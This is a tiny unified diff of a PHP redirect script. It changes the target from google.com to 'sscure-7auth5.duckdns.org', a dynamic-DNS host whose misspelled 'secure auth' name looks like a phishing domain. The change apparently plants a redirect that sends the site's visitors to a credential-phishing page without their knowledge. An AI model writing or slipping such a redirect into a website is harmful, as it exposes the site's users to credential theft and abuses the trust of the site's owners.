@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location: https://sscure-7auth5.duckdns.org/"); 
   
 exit; 
 ?> 
